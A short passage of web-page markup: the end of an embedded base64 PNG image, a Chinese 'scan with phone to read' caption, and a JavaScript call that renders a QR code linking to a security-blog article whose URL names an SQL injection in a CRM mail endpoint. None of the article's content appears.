c+2oO8dblOu8Ls2afPRmtCc0rH8NaRnu+wuUa5e4l1FqhfAyI/z5g/QPVx+mf3xfbD4bQpwSv5eNj601wjJrWMPc/81vLqD4KmHvBzLlWNVcCeg/XQufGHnCsZa97Cc0rd7QvWRYX3nsCayD3nv+0exuIr8xVnDpthGu3tH2Yg36lzTXTlkDX4THf5MMP9xLapNxhzmheCLGPtYzSHRA+r4XZq1ycQ+srUfnbQK40WJ6fP4FpIBBvA9R45ZFgrs11ELrfEKF15Q5zEH6vX0H3gugBHSvN3NU9oPeDx7zqAd1jHTo3DcSmhfecwBrIPed+uOu3DgTi6vnaZ8xPYD5zziF6QP+HnsoP4XPdEUL43CNjVQPhr7TM5T5HefZD9M1eCC77vnUgufHKj0/gTPnxgUC8Bc/eDOtnDwvRCziz7b/xBXZ0X4h1LoTg7MmYfeYh/ECWpxx42Fv1k2kjxCu2tH38+EDaTiu5dAJrIJeO6fdM00B0hc7i7NFcB3FlgWYH9msMlByw6+4hhOBcIM5hDsID/ZsAaxldB91vHWbOmhBCdw8hBAczSldA19RnDAhdXsc0kLForX/3BNpAIKYF1/DsMT3tZ3jWQ5rrIZ5JnMOa10IInzUhBCddIc6htcJrodavhGoUVY34MSpf5tpAMrny+05gDeS+sy93/h8AAAD//59pwcEAAAAGSURBVAMAJIP6a05yRzkAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-AjaxWriteMail-SQLi.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 